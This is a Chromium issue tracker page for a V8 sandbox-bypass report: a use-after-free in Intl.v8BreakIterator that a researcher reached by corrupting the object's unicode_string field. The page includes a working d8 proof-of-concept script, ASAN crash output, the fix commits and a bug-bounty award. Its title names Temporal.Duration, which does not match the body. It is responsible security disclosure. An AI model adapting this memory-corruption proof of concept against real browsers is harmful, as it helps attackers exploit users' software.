# V8 Sandbox Bypass: UAF via Temporal.Duration.prototype.total

| Field | Value |
|-------|-------|
| **Issue ID** | [484054137](https://issues.chromium.org/issues/484054137) |
| **Status** | Assigned |
| **Severity** | Unknown |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | 0x...@gmail.com |
| **Assignee** | is...@chromium.org |
| **Created** | 2026-02-13 |
| **Bounty** | $5,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

# V8 Sandbox Bypass: UAF via Intl.v8BreakIterator

# Other

Similar to <https://issues.chromium.org/issues/481749440>,
I personally do not believe this issue should be treated as a duplicate of 480122167 or 472139305.

That said, if others determine that this issue falls under the same broader vulnerability pattern (unsafe use of Managed::raw()), and that this report does not provide substantial new information; and if, because this pattern has already been identified, related issues based on it would be discovered through engineering review anyway, then it should be merged into 480122167/472139305. **I fully respect that decision**.

# Summary

A use-after-free can be triggered in the Intl.v8BreakIterator path under the sandbox attacker model (attacker already has in-sandbox heap arbitrary write).
JSV8BreakIterator stores both break\_iterator and unicode\_string as Foreign fields in sandbox heap. If unicode\_string is corrupted, the Managed[icu::UnicodeString](javascript:void(0);) keep-alive edge is removed; GC finalizes and frees the underlying icu::UnicodeString, while ICU BreakIterator still uses the freed buffer in next(), causing UAF (ASAN + sandbox violation).

# Details

In src/objects/js-break-iterator.tq:

```
extern class JSV8BreakIterator extends JSObject {
  locale: String;
  break_iterator: Foreign;  // Managed<icu::BreakIterator>;
  unicode_string: Foreign;  // Managed<icu::UnicodeString>;
  ...
}

```

In src/objects/js-break-iterator.cc:

```
  void JSV8BreakIterator::AdoptText(...) {
    icu::BreakIterator* break_iterator =
        break_iterator_holder->break_iterator()->raw();
    DirectHandle<Managed<icu::UnicodeString>> unicode_string =
        Intl::SetTextToBreakIterator(isolate, text, break_iterator);
    break_iterator_holder->set_unicode_string(*unicode_string);
    // step0: unicode_string field is the JS-side keep-alive edge for ICU text
  }

  DirectHandle<Object> JSV8BreakIterator::Next(...) {
    return isolate->factory()->NewNumberFromInt(
        break_iterator->break_iterator()->raw()->next());
    // step3: ICU uses cached text data
  }

  In src/objects/intl-objects.cc:

  DirectHandle<Managed<icu::UnicodeString>> Intl::SetTextToBreakIterator(...) {
    std::shared_ptr<icu::UnicodeString> u_text{...clone()...};
    DirectHandle<Managed<icu::UnicodeString>> new_u_text =
        Managed<icu::UnicodeString>::From(isolate, 0, u_text);
    break_iterator->setText(*u_text);
    return new_u_text;
  }

```

Under sandbox-testing (Sandbox.MemoryView), corrupting JSV8BreakIterator.unicode\_string to a non-Managed[icu::UnicodeString](javascript:void(0);) heap object removes the keep-alive reference. After gc(), ManagedObjectFinalizerSecondPass frees the shared\_ptr[icu::UnicodeString](javascript:void(0);) object. Subsequent bi.next() enters ICU and dereferences freed UnicodeString backing data, producing UAF.

# VERSION

V8 commit: 49c4494baf4ef665acc9abf37e78fb678786580e

# REPRODUCTION CASE

NOTE (for the shepherd): To reproduce in CF, the linux\_d8\_sandbox\_testing job type with the below shell args should hopefully do the trick.

Shell args:
--expose-gc --sandbox-testing

## PoC:

```
// d8 --expose-gc --sandbox-testing poc.js
if (typeof Sandbox !== 'object' || typeof Sandbox.MemoryView !== 'function') {
throw new Error('Sandbox testing mode not enabled');
}
if (typeof gc !== 'function') throw new Error('gc() missing');

const kLocaleOffset = 12;
const kBreakIteratorOffset = 16;
const kUnicodeStringOffset = 20;

const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

const bi = new Intl.v8BreakIterator('en', {type: 'word'});
const txt = 'abc '.repeat(20000);
bi.adoptText(txt);

const addr = Sandbox.getAddressOf(bi);
const locale_field = mem.getUint32(addr + kLocaleOffset, true);
const bi_field = mem.getUint32(addr + kBreakIteratorOffset, true);
const us_field = mem.getUint32(addr + kUnicodeStringOffset, true);

print('[*] JSV8BreakIterator @ 0x' + addr.toString(16));
print('[*] locale slot        = 0x' + locale_field.toString(16));
print('[*] break_iterator slot= 0x' + bi_field.toString(16));
print('[*] unicode_string slot= 0x' + us_field.toString(16));

// Corrupt: remove the Managed<icu::UnicodeString> keep-alive edge.
mem.setUint32(addr + kUnicodeStringOffset, locale_field, true);
print('[*] Corrupted unicode_string <- locale(String)');

for (let i = 0; i < 20; i++) gc();
print('[*] GC done, invoking iterator primitives');

let sum = 0;
for (let i = 0; i < 50000; i++) {
sum += bi.first();
sum += bi.next();
sum += bi.current();
}

print('done', sum);



```
## Sample output (excerpt)

```
out/x64.sandbox_and_asan/d8 --expose-gc --sandbox-testing poc.js
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x79c400000000,0x7ac400000000)
[*] JSV8BreakIterator @ 0x104ca4c
[*] locale slot        = 0x104ca3d
[*] break_iterator slot= 0x104ca2d
[*] unicode_string slot= 0x1060481
[*] Corrupted unicode_string <- locale(String)
[*] GC done, invoking iterator primitives
=================================================================
==118723==ERROR: AddressSanitizer: heap-use-after-free on address 0x7b052e66a804 at pc 0x55778afe20d3 bp 0x7fff7ef20200 sp 0x7fff7ef201f8
READ of size 2 at 0x7b052e66a804 thread T0
  #0 0x55778afe20d2 in handleNext<icu_77::RBBIStateTableRowT<unsigned char>, &icu_77::TrieFunc8> third_party/icu/source/common/rbbi.cpp:807:5
  #1 0x55778afe20d2 in icu_77::RuleBasedBreakIterator::handleNext() third_party/icu/source/common/rbbi.cpp:741:20
  #2 0x55778afe9af2 in icu_77::RuleBasedBreakIterator::BreakCache::populateFollowing() third_party/icu/source/common/rbbi_cache.cpp:480:16
  #3 0x55778afe97cd in icu_77::RuleBasedBreakIterator::BreakCache::nextOL() third_party/icu/source/common/rbbi_cache.cpp:275:19
  #4 0x55778afde438 in next third_party/icu/source/common/rbbi_cache.h:92:33
  #5 0x55778afde438 in icu_77::RuleBasedBreakIterator::next() third_party/icu/source/common/rbbi.cpp:594:18
  #6 0x557786f316be in v8::internal::JSV8BreakIterator::Next(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSV8BreakIterator>) src/objects/js-break-iterator.cc:194:48
  #7 0x5577861bb042 in v8::internal::Builtin_Impl_V8BreakIteratorInternalNext(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-intl.cc:1359:11
  #8 0x55778aac5f35 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
  #9 0x55778aa1483b in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
  #10 0x55778aa115db in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
  #11 0x55778aa1132a in Builtins_JSEntry setup-isolate-deserialize.cc
  #12 0x557786463686 in Call src/execution/simulator.h:216:12
  #13 0x557786463686 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
  #14 0x557786464b08 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
  #15 0x5577860118db in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2029:7
  #16 0x557785d4f287 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1037:44
  #17 0x557785d87959 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5650:10
  #18 0x557785d93e8d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6669:37
  #19 0x557785d932c5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6577:18
  #20 0x557785d969c7 in v8::Shell::Main(int, char**) src/d8/d8.cc:7492:18
  #21 0x7f05e1353082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16

0x7b052e66a804 is located 4 bytes inside of 200272-byte region [0x7b052e66a800,0x7b052e69b650)
freed by thread T0 here:
  #0 0x557785ce60a6 in free (/home/tester/WorkSpace/v8/out/x64.sandbox_and_asan/d8+0x14310a6) (BuildId: eb2674c4c330202f)
  #1 0x55778b09f0e8 in releaseArray third_party/icu/source/common/unistr.cpp:163:5
  #2 0x55778b09f0e8 in ~UnicodeString third_party/icu/source/common/unistr.cpp:477:3
  #3 0x55778b09f0e8 in icu_77::UnicodeString::~UnicodeString() third_party/icu/source/common/unistr.cpp:462:1
  #4 0x557786f244cf in __release_shared gen/third_party/libc++/src/include/__memory/shared_count.h:65:7
  #5 0x557786f244cf in __release_shared gen/third_party/libc++/src/include/__memory/shared_count.h:100:25
  #6 0x557786f244cf in ~shared_ptr gen/third_party/libc++/src/include/__memory/shared_ptr.h:501:17
  #7 0x557786f244cf in void v8::internal::detail::Destructor<icu_77::UnicodeString>(void*) src/objects/managed-inl.h:21:3
  #8 0x5577870545bb in v8::internal::(anonymous namespace)::ManagedObjectFinalizerSecondPass(v8::WeakCallbackInfo<void> const&) src/objects/managed.cc:21:3
  #9 0x55778652d6b2 in Invoke src/handles/global-handles.cc:867:3
  #10 0x55778652d6b2 in v8::internal::GlobalHandles::InvokeSecondPassPhantomCallbacks() src/handles/global-handles.cc:768:18
  #11 0x55778652f0f3 in v8::internal::GlobalHandles::PostGarbageCollectionProcessing(v8::GCCallbackFlags) src/handles/global-handles.cc:886:5
  #12 0x5577866c4143 in operator() src/heap/heap.cc:1747:34
  #13 0x5577866c4143 in InvokeExternalCallbacks<(lambda at ../../src/heap/heap.cc:1742:38)> src/heap/heap.cc:1560:3
  #14 0x5577866c4143 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck, v8::internal::PerformIneffectiveMarkCompactCheck) src/heap/heap.cc:1742:3
  #15 0x557786505c7f in v8::internal::(anonymous namespace)::InvokeGC(v8::Isolate*, v8::internal::(anonymous namespace)::GCOptions) src/extensions/gc-extension.cc:209:17
  #16 0x55778650471c in v8::internal::GCExtension::GC(v8::FunctionCallbackInfo<v8::Value> const&) src/extensions/gc-extension.cc:296:5
  #17 0x55778aa166a3 in Builtins_CallApiCallbackGeneric setup-isolate-deserialize.cc
  #18 0x55778aa1483b in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
  #19 0x55778aa115db in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
  #20 0x55778aa1132a in Builtins_JSEntry setup-isolate-deserialize.cc
  #21 0x557786463686 in Call src/execution/simulator.h:216:12
  #22 0x557786463686 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
  #23 0x557786464b08 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
  #24 0x5577860118db in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2029:7
  #25 0x557785d4f287 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1037:44
  #26 0x557785d87959 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5650:10
  #27 0x557785d93e8d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6669:37
  #28 0x557785d932c5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6577:18
  #29 0x557785d969c7 in v8::Shell::Main(int, char**) src/d8/d8.cc:7492:18
  #30 0x7f05e1353082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16

previously allocated by thread T0 here:
  #0 0x557785ce6344 in malloc (/home/tester/WorkSpace/v8/out/x64.sandbox_and_asan/d8+0x1431344) (BuildId: eb2674c4c330202f)
  #1 0x55778b09ca45 in allocate third_party/icu/source/common/unistr.cpp:421:44
  #2 0x55778b09ca45 in icu_77::UnicodeString::cloneArrayIfNeeded(int, int, signed char, int**, signed char) third_party/icu/source/common/unistr.cpp:1979:8
  #3 0x55778b09b496 in icu_77::UnicodeString::doAppend(char16_t const*, int, int) third_party/icu/source/common/unistr.cpp:1695:10
  #4 0x557786efd0ee in v8::internal::Intl::ToICUUnicodeString(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::String>, unsigned int) src/objects/intl-objects.cc:264:10
  #5 0x557786f173a3 in v8::internal::Intl::SetTextToBreakIterator(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::String>, icu_77::BreakIterator*) src/objects/intl-objects.cc:2624:7
  #6 0x557786f30d1a in v8::internal::JSV8BreakIterator::AdoptText(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSV8BreakIterator>, v8::internal::DirectHandle<v8::internal::String>) src/objects/js-break-iterator.cc:175:7
  #7 0x5577861b85e6 in v8::internal::Builtin_Impl_V8BreakIteratorInternalAdoptText(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-intl.cc:1299:3
  #8 0x55778aac5f35 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
  #9 0x55778aa1483b in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
  #10 0x55778aa115db in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
  #11 0x55778aa1132a in Builtins_JSEntry setup-isolate-deserialize.cc
  #12 0x557786463686 in Call src/execution/simulator.h:216:12
  #13 0x557786463686 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
  #14 0x557786464b08 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
  #15 0x5577860118db in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2029:7
  #16 0x557785d4f287 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1037:44
  #17 0x557785d87959 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5650:10
  #18 0x557785d93e8d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6669:37
  #19 0x557785d932c5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6577:18
  #20 0x557785d969c7 in v8::Shell::Main(int, char**) src/d8/d8.cc:7492:18
  #21 0x7f05e1353082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16

SUMMARY: AddressSanitizer: heap-use-after-free third_party/icu/source/common/rbbi.cpp:807:5 in handleNext<icu_77::RBBIStateTableRowT<unsigned char>, &icu_77::TrieFunc8>
Shadow bytes around the buggy address:
0x7b052e66a580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x7b052e66a600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x7b052e66a680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x7b052e66a700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x7b052e66a780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x7b052e66a800:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x7b052e66a880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x7b052e66a900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x7b052e66a980: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x7b052e66aa00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x7b052e66aa80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07 
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
==118723==ABORTING

## V8 sandbox violation detected!


```
# FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

Type of crash: Sandbox violation

# CREDIT INFORMATION

Reporter credit: 7resp4ss

## Timeline

### 0x...@gmail.com (2026-02-13)

# Bisect

f2d07ec516fc069e93df4b2983cbd112a8ade3e9
[intl] Port BreakIterator to C++

### ch...@google.com (2026-02-13)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### cl...@appspot.gserviceaccount.com (2026-02-13)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4872997483511808.

### ma...@google.com (2026-02-13)

Security shepherd: Provisional labels, over to v8 sheriff

### cl...@appspot.gserviceaccount.com (2026-02-13)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5775590766346240.

### ch...@google.com (2026-02-14)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-14)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### om...@google.com (2026-02-16)

Manish can you take a look at this? You seem to be familiar with this area. Thanks!

### em...@google.com (2026-02-16)

Planning to work on this together with [crbug.com/474402856](https://crbug.com/474402856).

### dx...@google.com (2026-02-18)

[Details redacted due to bug visibility]

Change-Id: I8a150d4e5d46c7c4c3d66f1950ef7b0af042b8ff  

<https://chrome-internal-review.git.corp.google.com/9031797>

### dx...@google.com (2026-02-18)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7581680>

[intl] Keep string with ICU break iterator

---


Expand for full commit details
```
     
    Store the text next to the ICU iterator in order to guarantee correct 
    lifetime. 
     
    Bug: 472181383, 474402856, 484054139, 484054140, 484054137, 484220944 
    Change-Id: I0a6fab76dd98bc1c3790756abe9b4e4016ba09e2 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7581680 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    Reviewed-by: Omer Katz <omerkatz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105321}

```

---

Files:

- M `include/v8-internal.h`
- M `src/builtins/builtins-intl.cc`
- M `src/diagnostics/objects-printer.cc`
- M `src/objects/intl-objects.cc`
- M `src/objects/intl-objects.h`
- M `src/objects/js-break-iterator-inl.h`
- M `src/objects/js-break-iterator.cc`
- M `src/objects/js-break-iterator.h`
- M `src/objects/js-break-iterator.tq`
- M `src/objects/js-segment-iterator-inl.h`
- M `src/objects/js-segment-iterator.cc`
- M `src/objects/js-segment-iterator.h`
- M `src/objects/js-segment-iterator.tq`
- M `src/objects/js-segments-inl.h`
- M `src/objects/js-segments.cc`
- M `src/objects/js-segments.h`
- M `src/objects/js-segments.tq`
- M `src/profiler/heap-snapshot-generator.cc`
- M `src/sandbox/testing.cc`
- M `test/mjsunit/sandbox/regress/regress-454734141.js`

---

Hash: [c128277d3ad09c3ddd56bafdfc191ac6dd2b5ce5](https://chromiumdash.appspot.com/commit/c128277d3ad09c3ddd56bafdfc191ac6dd2b5ce5)  

Date: Wed Feb 18 13:25:02 2026


---

### ch...@google.com (2026-05-28)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### dx...@google.com (2026-05-29)

Project: v8/v8  

Branch:  main  

Author:  Michael Lippautz [mlippautz@chromium.org](mailto:mlippautz@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7879914>

sandbox: Move regression tests into public repo

---


Expand for full commit details
```
     
    Bug: 517688821 
     
    Bug: 472181383, 474402856, 484054137,484054139, 484054140 
    Bug: 484220944 
    Change-Id: I21eb77742af1a6bf574a9f8d6d33247f25c44b79 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7879914 
    Reviewed-by: Arash Kazemi <arashk@chromium.org> 
    Commit-Queue: Michael Lippautz <mlippautz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#107656}

```

---

Files:

- A `test/mjsunit/sandbox/regress/regress-472181383.js`
- A `test/mjsunit/sandbox/regress/regress-474402856.js`
- A `test/mjsunit/sandbox/regress/regress-484054137.js`
- A `test/mjsunit/sandbox/regress/regress-484054139.js`
- A `test/mjsunit/sandbox/regress/regress-484054140.js`
- A `test/mjsunit/sandbox/regress/regress-484220944.js`

---

Hash: [3bb01464a8d669b614668d9661a8ead24871b96e](https://chromiumdash.appspot.com/commit/3bb01464a8d669b614668d9661a8ead24871b96e)  

Date: Fri May 29 10:50:56 2026


---

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
Baseline. V8 sandbox.


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

## Bounty Award

> Baseline. V8 sandbox.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/484054137)*
